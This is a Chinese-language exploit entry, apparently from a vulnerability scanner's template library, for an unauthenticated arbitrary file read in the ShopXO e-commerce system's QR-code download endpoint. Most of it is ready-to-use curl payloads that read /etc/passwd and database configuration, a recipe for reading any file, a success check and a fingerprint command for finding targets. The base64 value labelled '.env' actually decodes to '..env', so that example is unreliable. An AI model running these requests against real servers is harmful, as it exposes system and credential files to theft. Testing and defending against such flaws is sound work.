---
id: SHOPXO-FILE-READ
title: ShopXO 任意文件读取漏洞 (CNVD-2021-15822)
product: shopxo
vendor: ShopXO
version_affected: "ShopXO"
severity: HIGH
tags: [file_read, 无需认证, 国产]
fingerprint: ["ShopXO", "shopxo", "B2C电商"]
---

## 漏洞描述

ShopXO 开源电商系统的二维码下载接口 `/index.php?s=/index/qrcode/download/url/` 存在任意文件读取漏洞。`url` 参数为 base64 编码的文件路径，服务端未做路径限制，攻击者可读取服务器任意文件。

## 影响版本

- ShopXO（受影响版本）

## 前置条件

- 无需认证

## 利用步骤

1. 将要读取的文件路径进行 base64 编码
2. 构造 GET 请求访问 qrcode download 接口
3. 响应返回文件内容

## Payload

### 读取 /etc/passwd

```bash
# /etc/passwd → base64 = L2V0Yy9wYXNzd2Q=
curl -s "http://target/public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q="
```

### 读取数据库配置

```bash
# .env → base64 = Li5lbnY=
curl -s "http://target/public/index.php?s=/index/qrcode/download/url/Li5lbnY="
```

### 读取任意文件（生成 payload）

```bash
echo -n "/path/to/file" | base64
# 将结果拼接到 URL 中
curl -s "http://target/public/index.php?s=/index/qrcode/download/url/BASE64_VALUE"
```

## 验证方法

```bash
curl -s "http://target/public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q=" | grep "root:"
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "ShopXO\|shopxo"
```

## 参考链接

- https://www.cnvd.org.cn/flaw/show/CNVD-2021-15822
